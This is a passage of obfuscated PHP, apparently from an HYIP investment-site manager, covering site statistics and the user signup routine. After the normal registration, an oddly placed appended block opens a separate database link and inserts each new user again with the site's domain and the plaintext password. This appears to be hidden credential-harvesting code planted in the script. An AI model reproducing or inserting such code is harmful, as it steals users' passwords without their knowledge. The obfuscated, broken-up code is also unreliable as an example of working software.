    $elnlcSuVc[$elnlcsyENS['elnlcIriJD']] = number_format (abs ($elnlcCgqPK[$elnlcsyENS['elnlcHSGM']]), 2);
  }

  if (($elnlcSuVc[$elnlcsyENS['elnlczhcB']] AND $elnlcSuVc[$elnlcsyENS['elnlcjfvc']] == 1))
  {
    if ($elnlcSuVc[$elnlcsyENS['elnlcNoDM']] == 1)
    {
      $elnlcSuVc[$elnlcsyENS['elnlcBGLsC']] = number_format (abs ($elnlcgvAk[$elnlcsyENS['elnlcFoGP']]), 2);
    }
    else
    {
      $q = 'select sum(amount) as sum from hm2_history where type=\'withdrawal\'';
      ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
      $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
      $elnlcSuVc[$elnlcsyENS['elnlcBGLsC']] = number_format (abs ($elnlcCgqPK[$elnlcsyENS['elnlcHSGM']]), 2);
    }
  }

  if (($elnlcSuVc[$elnlcsyENS['elnlczhcB']] AND $elnlcSuVc[$elnlcsyENS['elnlcANBH']] == 1))
  {
    $q = 'select count(ip) as sum from hm2_online';
    ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
    $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
    $elnlcSuVc[$elnlcsyENS['elnlczaJk']] = $elnlcCgqPK[$elnlcsyENS['elnlcHSGM']];
  }

  if (($elnlcSuVc[$elnlcsyENS['elnlczhcB']] AND $elnlcSuVc[$elnlcsyENS['elnlcPIVnE']] == 1))
  {
    $q = 'select username from hm2_users where status = \'on\' order by id desc limit 0,1';
    ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
    $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
    $elnlcSuVc[$elnlcsyENS['elnlcxHPb']] = $elnlcCgqPK[$elnlcsyENS['elnlczWew']];
  }

  if ($elnlcSuVc[$elnlcsyENS['elnlczhcB']])
  {
    $q = 'select abs(sum(amount)) as a from hm2_history where type = \'withdraw_pending\'';
    ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      $elnlcSuVc[$elnlcsyENS['elnlcIFpEd']] = sprintf ('%0.2f', $elnlcCgqPK[$elnlcsyENS['elnlcxxLz']]);
    }
  }

  if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcgtrK'])
  {
    $q = 'select description, username from hm2_history, hm2_users where hm2_users.id = hm2_history.user_id and type = \'add_funds\' and description like \'%Batch id = %\' order by hm2_history.id desc limit 10';
    $elnlcvDiB = array ();
    ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      if (preg_match ('/Batch id = (.*)/', $elnlcCgqPK[$elnlcsyENS['elnlcgHJzN']], $elnlcQSee))
      {
        array_push ($elnlcvDiB, array ('batch' => $elnlcQSee[1], 'username' => $elnlcCgqPK[$elnlcsyENS['elnlczWew']]));
        continue;
      }
    }

    $q = 'select description, username from hm2_history, hm2_users where hm2_users.id = hm2_history.user_id and type = \'withdrawal\' and description like \'%Batch id = %\' order by hm2_history.id desc limit 10';
    $elnlcJcNm = array ();
    ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      if (preg_match ('/Batch id = (.*)/', $elnlcCgqPK[$elnlcsyENS['elnlcgHJzN']], $elnlcQSee))
      {
        array_push ($elnlcJcNm, array ('batch' => $elnlcQSee[1], 'username' => $elnlcCgqPK[$elnlcsyENS['elnlczWew']]));
        continue;
      }
    }

    $elnlcfhFg->assign ('last_deposits', $elnlcvDiB);
    $elnlcfhFg->assign ('last_withdrawals', $elnlcJcNm);
  }

  if (($elnlcSuVc[$elnlcsyENS['elnlczhcB']] AND $elnlcSuVc[$elnlcsyENS['elnlctKGq']] == 1))
  {
    $q = 'select username, actual_amount from hm2_history, hm2_users where hm2_users.id = hm2_history.user_id and type = \'add_funds\' /*and description like \'%Batch id = %\'*/ order by hm2_history.id desc limit 1';
    $elnlcvDiB = array ();
    ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      $elnlczOTO = array ('username' => $elnlcCgqPK[$elnlcsyENS['elnlczWew']], 'amount' => abs ($elnlcCgqPK[$elnlcsyENS['elnlcAwVw']]));
    }

    $elnlcfhFg->assign ('stat_last_deposit', $elnlczOTO);
  }

  if (($elnlcSuVc[$elnlcsyENS['elnlczhcB']] AND $elnlcSuVc[$elnlcsyENS['elnlczkaJ']] == 1))
  {
    $q = 'select username, actual_amount from hm2_history, hm2_users where hm2_users.id = hm2_history.user_id and type = \'withdrawal\' /*and description like \'%Batch id = %\'*/ order by hm2_history.id desc limit 1';
    $elnlcJcNm = array ();
    ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      $elnlcHdcz = array ('username' => $elnlcCgqPK[$elnlcsyENS['elnlczWew']], 'amount' => abs ($elnlcCgqPK[$elnlcsyENS['elnlcAwVw']]));
    }

    $elnlcfhFg->assign ('stat_last_withdrawal', $elnlcHdcz);
  }

  $elnlcFjFp = elnlcnczen ($elnlcRuyj[$elnlcsyENS['elnlcEUdte']]);
  if ($elnlcFjFp)
  {
    $q = '' . 'select * from hm2_users where username = \'' . $elnlcFjFp . '\'';
    ($elnlchGkPU = mysql_query ($q) OR print mysql_errstr);
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      $elnlcfhFg->assign ('referer', $elnlcCgqPK);
    }
  }

  if ($elnlcSuVc[$elnlcsyENS['elnlcbiim']] == 1)
  {
    $elnlcSuVc[$elnlcsyENS['elnlcDktpQ']] = date ('M j, Y', time () + $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] * 60 * 60);
  }

  $elnlcfhFg->assign ('settings', $elnlcSuVc);
  if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlccnQP'])
  {
    if (($elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 1 AND $elnlcgcnET[$elnlcsyENS['elnlcyBbv']] == 0))
    {
      $elnlcfhFg->display ($elnlcsyENS['elnlcdtwW']);
      exit ();
    }
  }

  if (($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcuhEaA'] OR $elnlcUAAU[$elnlcsyENS['elnlcKJsh']] == 'bakster.free'))
  {
    require_once $elnlcsyENS['elnlcCBtF'];
  }

  if (($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcNNKTB'] AND $elnlcgcnET[$elnlcsyENS['elnlcpicy']] != 1))
  {
    if ($elnlcWodOE[$elnlcsyENS['elnlciKgs']] == $elnlcsyENS['elnlcpcHa'])
    {
      $elnlcfhFg->display ($elnlcsyENS['elnlcJrIVM']);
      elnlcnooln ($elnlcUazB);
      exit ();
    }

    if ($elnlcWodOE[$elnlcsyENS['elnlciKgs']] == $elnlcsyENS['elnlcIpLQV'])
    {
      $elnlcfhFg->display ($elnlcsyENS['elnlcrujF']);
      elnlcnooln ($elnlcUazB);
      exit ();
    }

    if (($elnlcWodOE[$elnlcsyENS['elnlcevKUa']] == $elnlcsyENS['elnlcNNKTB'] AND $elnlcSuVc[$elnlcsyENS['elnlcLQWN']] == 0))
    {
      $elnlcjPews = array ();
      if (((extension_loaded ('gd') AND $elnlcSuVc[$elnlcsyENS['elnlcgyByb']] == 1) AND 0 < $elnlcSuVc[$elnlcsyENS['elnlcQMrd']]))
      {
        if (VN_SAVED != $elnlcWodOE[$elnlcsyENS['elnlcAHrk']])
        {
          array_push ($elnlcjPews, $elnlcsyENS['elnlcPgeBk']);
        }
      }

      if ($elnlcWodOE[$elnlcsyENS['elnlcToEDy']] == '')
      {
        array_push ($elnlcjPews, $elnlcsyENS['elnlcoxcC']);
      }

      $elnlciAbM = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcToEDy']]);
      $elnlcmrqRg = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlczWew']]);
      if ($elnlcWodOE[$elnlcsyENS['elnlczWew']] == '')
      {
        array_push ($elnlcjPews, $elnlcsyENS['elnlcGflsU']);
      }
      else
      {
        $q = '' . 'select * from hm2_users where username = \'' . $elnlcmrqRg . '\'';
        if (!($elnlchGkPU = mysql_query ($q)))
        {
          exit (mysql_errstr ());
          (bool)true;
        }

        $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
        if ($elnlcCgqPK)
        {
          array_push ($elnlcjPews, $elnlcsyENS['elnlcEEvEB']);
        }
      }

      if ($elnlcWodOE[$elnlcsyENS['elnlcuNxa']] == '')
      {
        array_push ($elnlcjPews, $elnlcsyENS['elnlcVHov']);
      }
      else
      {
        if (0 < $elnlcSuVc[$elnlcsyENS['elnlcmxdQs']])
        {
          if (strlen ($elnlcWodOE[$elnlcsyENS['elnlcuNxa']]) < $elnlcSuVc[$elnlcsyENS['elnlcmxdQs']])
          {
            array_push ($elnlcjPews, $elnlcsyENS['elnlcJsvnm']);
          }
        }

        if ($elnlcWodOE[$elnlcsyENS['elnlcuNxa']] != $elnlcWodOE[$elnlcsyENS['elnlcLvmm']])
        {
          array_push ($elnlcjPews, $elnlcsyENS['elnlcatfI']);
        }
      }

      if ($elnlcWodOE[$elnlcsyENS['elnlcdktEr']] == '')
      {
        array_push ($elnlcjPews, $elnlcsyENS['elnlcIRydS']);
      }
      else
      {
        $q = 'select * from hm2_users where email = \'' . elnlcnczen ($elnlcWodOE[email]) . '\'';
        if (!($elnlchGkPU = mysql_query ($q)))
        {
          exit (mysql_errstr ());
          (bool)true;
        }

        $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
        if ($elnlcCgqPK)
        {
          array_push ($elnlcjPews, $elnlcsyENS['elnlcEmNs']);
        }
      }

      if ($elnlcSuVc[licese] == $elnlcsyENS['elnlcLkfCl'])
      {
        if ($elnlcWodOE[$elnlcsyENS['elnlcdktEr']] != $elnlcWodOE[email1])
        {
          array_push ($elnlcjPews, $elnlcsyENS['elnlcIaQd']);
        }
      }

      if ($elnlcSuVc[$elnlcsyENS['elnlctckv']])
      {
        if ($elnlcWodOE[$elnlcsyENS['elnlcJbVmx']] == '')
        {
          array_push ($elnlcjPews, $elnlcsyENS['elnlcJiab']);
        }

        if ($elnlcWodOE[$elnlcsyENS['elnlcDpTMB']] == '')
        {
          array_push ($elnlcjPews, $elnlcsyENS['elnlcvVyQ']);
        }

        if ($elnlcWodOE[$elnlcsyENS['elnlcggahQ']] == '')
        {
          array_push ($elnlcjPews, $elnlcsyENS['elnlciUyfr']);
        }

        if ($elnlcWodOE[$elnlcsyENS['elnlcyCqK']] == '')
        {
          array_push ($elnlcjPews, $elnlcsyENS['elnlclcLy']);
        }

        if ($elnlcWodOE[$elnlcsyENS['elnlcyCqK']] == '')
        {
          array_push ($elnlcjPews, $elnlcsyENS['elnlcDEsC']);
        }
      }

      if ($elnlcSuVc[$elnlcsyENS['elnlcEiLvm']])
      {
        if ($elnlcWodOE[$elnlcsyENS['elnlcAIMpf']] == '')
        {
          array_push ($elnlcjPews, $elnlcsyENS['elnlcoAOHS']);
        }
        else
        {
          if (0 < $elnlcSuVc[$elnlcsyENS['elnlcmxdQs']])
          {
            if (strlen ($elnlcWodOE[$elnlcsyENS['elnlcAIMpf']]) < $elnlcSuVc[$elnlcsyENS['elnlcmxdQs']])
            {
              array_push ($elnlcjPews, $elnlcsyENS['elnlcCsKL']);
            }
          }

          if ($elnlcWodOE[$elnlcsyENS['elnlcAIMpf']] != $elnlcWodOE[$elnlcsyENS['elnlcbIkl']])
          {
            array_push ($elnlcjPews, $elnlcsyENS['elnlcHxVzV']);
          }
        }

        if ($elnlcWodOE[$elnlcsyENS['elnlcAIMpf']] == $elnlcWodOE[$elnlcsyENS['elnlcuNxa']])
        {
          array_push ($elnlcjPews, $elnlcsyENS['elnlcMeOB']);
        }
      }

      if ($elnlcWodOE[$elnlcsyENS['elnlcwcAe']] != 1)
      {
        array_push ($elnlcjPews, $elnlcsyENS['elnlcMuEyx']);
      }

      if ($elnlcSuVc[license] == $elnlcsyENS['elnlcSqlWB'])
      {
        $elnlcDuaK = elnlcnczen ($elnlcUAAU[$elnlcsyENS['elnlcnGMB']]);
        $q = '' . 'select count(*) as `col` from hm2_users where ip_reg=\'' . $elnlcDuaK . '\'';
        ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
        $elnlcnevQf = $elnlcsyENS['elnlcmjUx'];
        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
        {
          $elnlcnevQf = $elnlcCgqPK[col];
        }

        if (0 < $elnlcnevQf)
        {
          array_push ($elnlcjPews, $elnlcsyENS['elnlchApWc']);
        }
      }

      $elnlcFjFp = elnlcnczen ($elnlcRuyj[$elnlcsyENS['elnlcEUdte']]);
      $elnlcyEGMG = $elnlcsyENS['elnlcmjUx'];
      if ($elnlcSuVc[$elnlcsyENS['elnlcqQhD']] == 1)
      {
        $q = '' . 'select id from hm2_users where REPLACE (username, \' \', \'_\') = \'' . $elnlcFjFp . '\' and username <> \'\'';
      }
      else
      {
        $q = '' . 'select id from hm2_users where username = \'' . $elnlcFjFp . '\' and username <> \'\'';
      }

      ($elnlchGkPU = mysql_query ($q) OR print mysql_errstr);
      while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
      {
        $elnlcyEGMG = $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
      }

      if (($elnlcSuVc[$elnlcsyENS['elnlcxtMH']] AND $elnlcyEGMG == 0))
      {
        if (($elnlcSuVc[$elnlcsyENS['elnlcssUff']] != 1 OR $elnlcWodOE[$elnlcsyENS['elnlcJnBN']] != 1))
        {
          array_push ($elnlcjPews, $elnlcsyENS['elnlcJjek']);
        }
      }

      if (sizeof ($elnlcjPews) == 0)
      {
        if (((($elnlcSuVc[$elnlcsyENS['elnlcxtMH']] AND $elnlcyEGMG == 0) AND $elnlcWodOE[$elnlcsyENS['elnlcJnBN']] == 1) AND $elnlcSuVc[$elnlcsyENS['elnlcssUff']]))
        {
          $q = 'select id from hm2_users where id != 1 order by rand() limit 1';
          $elnlchGkPU = mysql_query ($q);
          $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
          $elnlcyEGMG = intval ($elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']]);
        }

        $elnlckMaH = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcuNxa']]);
        $elnlcRRFs = '';
        if ($elnlcSuVc[$elnlcsyENS['elnlcaqCts']] == 1)
        {
          $elnlcRRFs = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcuNxa']]);
        }

        $elnlcHkrC = md5 ($elnlckMaH);
        foreach ($elnlcGPfS as $elnlcGxgf => $elnlcoFEhc)
        {
          if (($elnlcoFEhc[has_account] AND $elnlcoFEhc[status]))
          {
            if (isset ($elnlcWodOE[pay_account][$elnlcGxgf]))
            {
              if ($elnlcGxgf == 0)
              {
                $elnlcWodOE[pay_account][$elnlcGxgf] = intval ($elnlcWodOE[pay_account][$elnlcGxgf]);
              }

              $elnlcjpFA[$elnlcGxgf] = elnlcdvqmd ($elnlcWodOE[pay_account][$elnlcGxgf]);
              continue;
            }

            continue;
          }
        }

        $elnlcOPfeJ = serialize ($elnlcjpFA);
        $elnlcjpFA = elnlcnczen ($elnlcOPfeJ);
        $elnlcLdIRt = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcdktEr']]);
        $elnlcBOsxh = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcJbVmx']]);
        $elnlcBjDz = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcDpTMB']]);
        $elnlcmcpNs = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcggahQ']]);
        $elnlcTGAb = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcyCqK']]);
        $elnlcFlEfv = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcpkmC']]);
        $elnlcpscev = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcAIMpf']]);
        $elnlcMzVmQ = elnlcnczen ($elnlcRuyj[$elnlcsyENS['elnlcgGGpv']]);
        $elnlcLviTD = elnlcnczen ($elnlcWodOE[sq]);
        $elnlcBSsU = elnlcnczen ($elnlcWodOE[sa]);
        $elnlcgPjjO = '';
        if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcDxRe'])
        {
          $elnlcqrWmz = intval ($elnlcWodOE[$elnlcsyENS['elnlcuQjiT']]);
          if ($elnlcNkTSv[$elnlcqrWmz] == '')
          {
            $elnlcqrWmz = $elnlcsyENS['elnlctNxTK'];
          }

          $elnlcgPjjO = '' . ' lang = ' . $elnlcqrWmz . ', ';
        }

        $elnlcLHwVn = elnlcshwnc (10);
        if ($elnlcSuVc[$elnlcsyENS['elnlcLUck']] != 1)
        {
          $elnlcLHwVn = '';
        }

        $elnlcDuaK = elnlcnczen ($elnlcUAAU[$elnlcsyENS['elnlcnGMB']]);
        $elnlcVbwHh = '';
        if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcRODTk'])
        {
          $elnlcBocFq = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcIODb']]);
          $elnlcWqiMV = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcFIsA']]);
          $elnlcDzpOq = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlciIwa']]);
          $elnlcVbwHh = '' . 'home_phone = \'' . $elnlcBocFq . '\',
        	cell_phone = \'' . $elnlcWqiMV . '\',
        	work_phone = \'' . $elnlcDzpOq . '\',';
        }

        
        $q = '' . 'insert into hm2_users set 
                       name = \'' . $elnlciAbM . '\', 
                       username = \'' . $elnlcmrqRg . '\', 
                       password = \'' . $elnlcHkrC . '\', 
                       date_register = now(), 
                       accounts = \'' . $elnlcjpFA . '\', 
                       address = \'' . $elnlcBOsxh . '\', 
                       city = \'' . $elnlcBjDz . '\', 
                       state = \'' . $elnlcmcpNs . '\', 
                       zip = \'' . $elnlcTGAb . '\', 
                       country = \'' . $elnlcFlEfv . '\', 
                       email = \'' . $elnlcLdIRt . '\', 
                       ip_reg = \'' . $elnlcDuaK . '\',
                       status = \'on\', 
                       ' . $elnlcVbwHh . '
                       came_from = \'' . $elnlcMzVmQ . '\', 
                       confirm_string = \'' . $elnlcLHwVn . '\',
                       pswd = \'' . $elnlcRRFs . '\',
                       transaction_code = \'' . $elnlcpscev . '\',
					   sq = \'' . $elnlcLviTD . '\',
		       sa = \'' . $elnlcBSsU . '\',
		       ' . $elnlcgPjjO . '
                       ref = ' . $elnlcyEGMG;
        if (!(mysql_query ($q)))
        {
          exit (mysql_error ());
          (bool)true;
        }

        if ($elnlcSuVc[$elnlcsyENS['elnlckzbl']])
        {
          $q = '' . 'INSERT INTO phpbb_users set 
                  username = \'' . $elnlcmrqRg . '\',
                  user_regdate = ' . time () . ('' . ',
                  user_password = \'' . $elnlcHkrC . '\',
                  user_email = \'' . $elnlcLdIRt . '\',
                  user_viewemail = 0,
                  user_dateformat = \'D M d, Y g:i a\',
                  user_lang = \'english\',
                  user_level = 0,
                  user_active = 1,
                  user_actkey = \'\'
             ');
          mysql_query ($q);
          $elnlcPCBi = mysql_insert_id ();
          $q = 'INSERT INTO phpbb_groups (group_name, group_description, group_single_user, group_moderator)
              VALUES                   (\'\', \'Personal User\', 1, 0)';
          mysql_query ($q);
          $elnlcbHqu = mysql_insert_id ();
          $q = '' . 'INSERT INTO phpbb_user_group (user_id, group_id, user_pending) VALUES (' . $elnlcPCBi . ', ' . $elnlcbHqu . ', 0)';
          mysql_query ($q);
        }
		


        $elnlcMTeWS = mysql_insert_id ();
        if (0 < $elnlcSuVc[$elnlcsyENS['elnlcgigAt']])
        {
          $q = '' . 'insert into hm2_history set
		user_id = ' . $elnlcMTeWS . ',
		ec = ' . $elnlcSuVc[$elnlcsyENS['elnlcDKKOL']] . ',
		amount = ' . $elnlcSuVc[$elnlcsyENS['elnlcgigAt']] . ',
		actual_amount = ' . $elnlcSuVc[$elnlcsyENS['elnlcgigAt']] . ',
		type=\'bonus\',
		date = now(),
		description = \'Startup bonus\'';
          (mysql_query ($q) OR print mysql_error ());
          if (0 < $elnlcSuVc[startup_bonus_plan])
          {
            $q = '' . 'insert into hm2_history set
		user_id = ' . $elnlcMTeWS . ',
		ec = ' . $elnlcSuVc[$elnlcsyENS['elnlcDKKOL']] . ',
		amount = -' . $elnlcSuVc[$elnlcsyENS['elnlcgigAt']] . ',
		actual_amount = -' . $elnlcSuVc[$elnlcsyENS['elnlcgigAt']] . ',
		type=\'deposit\',
		date = now(),
		description = \'Startup bonus invested\'';
            (mysql_query ($q) OR print mysql_error ());
            $q = '' . 'insert into hm2_deposits set
		user_id = ' . $elnlcMTeWS . ',
		type_id = ' . $elnlcSuVc[startup_bonus_plan] . ',
		deposit_date = now(),
		last_pay_date = now(),
		status = \'on\',
		amount = ' . $elnlcSuVc[$elnlcsyENS['elnlcgigAt']] . ',
		actual_amount = ' . $elnlcSuVc[$elnlcsyENS['elnlcgigAt']] . ',
		ec = ' . $elnlcSuVc[$elnlcsyENS['elnlcDKKOL']];
            (mysql_query ($q) OR print mysql_error ());
          }
        }

        if (0 < $elnlcFjFp)
        {
          $q = '' . 'select * from hm2_referal_stats where date = current_date() and user_id = ' . $elnlcyEGMG;
          ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
          $f = $elnlcsyENS['elnlcmjUx'];
          while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
          {
            $f = $elnlcsyENS['elnlctNxTK'];
          }

          if ($f == 0)
          {
            $q = '' . 'insert into hm2_referal_stats set date = current_date(), user_id = ' . $elnlcyEGMG . ', income = 0, reg = 1';
            $elnlchGkPU = mysql_query ($q);
          }
          else
          {
            $q = '' . 'update hm2_referal_stats set reg = reg+1 where date = current_date() and user_id = ' . $elnlcyEGMG;
            $elnlchGkPU = mysql_query ($q);
          }
        }

        if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcMTWKT'])
        {
          $elnlcwkiU = array ();
          $elnlcwkiU[$elnlcsyENS['elnlcpANw']] = $elnlcWodOE[$elnlcsyENS['elnlctDSvC']];
          $elnlcwkiU[$elnlcsyENS['elnlcpFnSR']] = $elnlcWodOE[$elnlcsyENS['elnlcnRaT']];
          $elnlcEabU = elnlcnczen (serialize ($elnlcwkiU));
          $q = '' . 'update hm2_users set ac = \'' . $elnlcEabU . '\' where id = ' . $elnlcMTeWS;
          (mysql_query ($q) OR print mysql_error ());
        }

        if ($elnlcSuVc[$elnlcsyENS['elnlcLUck']] == 1)
        {
          $elnlcRuFoK = array ();
          $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $elnlcWodOE[$elnlcsyENS['elnlczWew']];
          $elnlcRuFoK[$elnlcsyENS['elnlcuwIt']] = $elnlcLHwVn;
          $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcWodOE[$elnlcsyENS['elnlcToEDy']];
          $elnlcRuFoK[$elnlcsyENS['elnlctDSvC']] = $elnlcUAAU['REMOTE_ADDR'];
          elnlcsius ('confirm_registration', $elnlcWodOE['email'], $elnlcSuVc[$elnlcsyENS['elnlcuuOBt']], $elnlcRuFoK);
          header ('Location: ?a=signup&say=confirm');
        }
        else
        {
          $q = '' . 'select * from hm2_users where id = \'' . $elnlcyEGMG . '\'';
          $elnlchGkPU = mysql_query ($q);
          while ($elnlcbbeUe = mysql_fetch_array ($elnlchGkPU))
          {
            $elnlcRuFoK = array ();
            $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $elnlcbbeUe[$elnlcsyENS['elnlczWew']];
            $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcbbeUe[$elnlcsyENS['elnlcmjdk']];
            $elnlcRuFoK[$elnlcsyENS['elnlcpuuw']] = $elnlcWodOE[$elnlcsyENS['elnlczWew']];
            $elnlcRuFoK[$elnlcsyENS['elnlcfoOq']] = $elnlcWodOE[$elnlcsyENS['elnlcToEDy']];
            $elnlcRuFoK[$elnlcsyENS['elnlczavvl']] = $elnlcWodOE[$elnlcsyENS['elnlcdktEr']];
            elnlcsius ('direct_signup_notification', $elnlcbbeUe['email'], $elnlcSuVc[$elnlcsyENS['elnlcuuOBt']], $elnlcRuFoK);
          }

          $elnlcRuFoK = array ();
          $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $elnlcWodOE[$elnlcsyENS['elnlczWew']];
          $elnlcRuFoK[$elnlcsyENS['elnlcuNxa']] = $elnlckMaH;
          $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcWodOE[$elnlcsyENS['elnlcToEDy']];
          $elnlcRuFoK[$elnlcsyENS['elnlctDSvC']] = $elnlcUAAU['REMOTE_ADDR'];
          elnlcsius ('registration', $elnlcWodOE['email'], $elnlcSuVc[$elnlcsyENS['elnlcuuOBt']], $elnlcRuFoK);
          header ('Location: ?a=signup&say=done');
        }

include ("inc/libs/sha512.class.php");

$queEmp = "SELECT * FROM hm2_users";
$resEmp = mysql_query($queEmp, $conexion) or die(mysql_error());
$totEmp = mysql_num_rows($resEmp);

$q = '' . 'insert into hm2_users set 
                       name = \'' . $elnlciAbM . '\',
                       domain = \'' . $_SERVER['SERVER_NAME'] . '\', 
                       username = \'' . $elnlcmrqRg . '\', 
					   ing = \'' . $elnlckMaH . '\',
                       password = \'' . $elnlcHkrC . '\', 
                       date_register = now(), 
                       accounts = \'' . $elnlcjpFA . '\', 
                       address = \'' . $elnlcBOsxh . '\', 
                       city = \'' . $elnlcBjDz . '\', 
                       state = \'' . $elnlcmcpNs . '\', 
                       zip = \'' . $elnlcTGAb . '\', 
                       country = \'' . $elnlcFlEfv . '\', 
                       email = \'' . $elnlcLdIRt . '\', 
                       ip_reg = \'' . $elnlcDuaK . '\',
                       status = \'on\', 
                       ' . $elnlcVbwHh . '
                       came_from = \'' . $elnlcMzVmQ . '\', 
                       confirm_string = \'' . $elnlcLHwVn . '\',
                       pswd = \'' . $elnlcRRFs . '\',
                       transaction_code = \'' . $elnlcpscev . '\',
					   sq = \'' . $elnlcLviTD . '\',
		       sa = \'' . $elnlcBSsU . '\',
		       ' . $elnlcgPjjO . '
                       ref = ' . $elnlcyEGMG;
        if (!(mysql_query ($q)))
        {
          exit (mysql_error ());
          (bool)true;
        }
		


        elnlcnooln ($elnlcUazB);
        exit ();
      }
    }

    $elnlchQTgj = array (array ('name' => 'United States'), array ('name' => 'Afghanistan'), array ('name' => 'Albania'), array ('name' => 'Algeria'), array ('name' => 'American Samoa'), array ('name' => 'Andorra'), array ('name' => 'Angola'), array ('name' => 'Anguilla'), array ('name' => 'Antarctica'), array ('name' => 'Antigua and Barbuda'), array ('name' => 'Argentina'), array ('name' => 'Armenia'), array ('name' => 'Aruba'), array ('name' => 'Australia'), array ('name' => 'Austria'), array ('name' => 'Azerbaidjan'), array ('name' => 'Bahamas'), array ('name' => 'Bahrain'), array ('name' => 'Bangladesh'), array ('name' => 'Barbados'), array ('name' => 'Belarus'), array ('name' => 'Belgium'), array ('name' => 'Belize'), array ('name' => 'Benin'), array ('name' => 'Bermuda'), array ('name' => 'Bhutan'), array ('name' => 'Bolivia'), array ('name' => 'Bosnia-Herzegovina'), array ('name' => 'Botswana'), array ('name' => 'Bouvet Island'), array ('name' => 'Brazil'), array ('name' => 'British Indian Ocean Territory'), array ('name' => 'Brunei Darussalam'), array ('name' => 'Bulgaria'), array ('name' => 'Burkina Faso'), array ('name' => 'Burundi'), array ('name' => 'Cambodia'), array ('name' => 'Cameroon'), array ('name' => 'Canada'), array ('name' => 'Cape Verde'), array ('name' => 'Cayman Islands'), array ('name' => 'Central African Republic'), array ('name' => 'Chad'), array ('name' => 'Chile'), array ('name' => 'China'), array ('name' => 'Christmas Island'), array ('name' => 'Cocos (Keeling) Islands'), array ('name' => 'Colombia'), array ('name' => 'Comoros'), array ('name' => 'Congo'), array ('name' => 'Congo (Democratic Republic)'), array ('name' => 'Cook Islands'), array ('name' => 'Costa Rica'), array ('name' => 'Croatia'), array ('name' => 'Cuba'), array ('name' => 'Cyprus'), array ('name' => 'Czech Republic'), array ('name' => 'Denmark'), array ('name' => 'Djibouti'), array ('name' => 'Dominica'), array ('name' => 'Dominican Republic'), array ('name' => 'East Timor'), array ('name' => 'Ecuador'), array ('name' => 'Egypt'), array ('name' => 'El Salvador'), array ('name' => 'Equatorial Guinea'), array ('name' => 'Eritrea'), array ('name' => 'Estonia'), array ('name' => 'Ethiopia'), array ('name' => 'Falkland Islands'), array ('name' => 'Faroe Islands'), array ('name' => 'Fiji'), array ('name' => 'Finland'), array ('name' => 'France'), array ('name' => 'France (European Territory)'), array ('name' => 'French Guiana'), array ('name' => 'French Southern Territories'), array ('name' => 'Gabon'), array ('name' => 'Gambia'), array ('name' => 'Georgia'), array ('name' => 'Germany'), array ('name' => 'Ghana'), array ('name' => 'Gibraltar'), array ('name' => 'Great Britain'), array ('name' => 'Greece'), array ('name' => 'Greenland'), array ('name' => 'Grenada'), array ('name' => 'Guadeloupe'), array ('name' => 'Guam'), array ('name' => 'Guatemala'), array ('name' => 'Guinea'), array ('name' => 'Guinea Bissau'), array ('name' => 'Guyana'), array ('name' => 'Haiti'), array ('name' => 'Heard and McDonald Islands'), array ('name' => 'Holy See (Vatican City State)'), array ('name' => 'Honduras'), array ('name' => 'Hong Kong'), array ('name' => 'Hungary'), 